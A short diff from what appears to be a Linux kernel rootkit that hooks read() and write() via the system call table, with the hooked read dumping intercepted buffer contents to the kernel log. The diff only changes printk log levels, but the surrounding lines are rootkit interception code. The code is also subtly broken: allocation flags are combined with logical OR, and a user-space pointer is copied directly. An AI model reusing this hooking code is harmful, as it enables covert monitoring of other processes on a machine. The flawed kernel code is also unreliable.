@@ -26,7 +26,7 @@ asmlinkage int rk_read(unsigned int fd, void __user* buf, size_t count) {
 	char* str_buf = (char*)kmalloc(count + 1, GFP_KERNEL || GFP_NOIO || GFP_NOFS);
 	memcpy(str_buf, buf, count);
 	str_buf[count] = 0;
-	printk("Intercepted a read call:\n  FD:%i\n  Size:%li\n  Buffer:%s", fd, count, str_buf);
+	printk(KERN_INFO "Intercepted a read call:\n  FD:%i\n  Size:%li\n  Buffer:%s", fd, count, str_buf);
 	kfree(str_buf);
 	// end example code
 	return (*original_read)(fd, buf, count);
@@ -34,7 +34,7 @@ asmlinkage int rk_read(unsigned int fd, void __user* buf, size_t count) {
 
 static int __init rk_init(void) {
 	printk(KERN_INFO "Hello.\n");
-	printk(KERN_ALERT "System call table at %p\n", SYS_CALL_TABLE);
+	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);
 	bitMe();
 	//hook write()
 	original_write = (void*)SYS_CALL_TABLE[__NR_write];
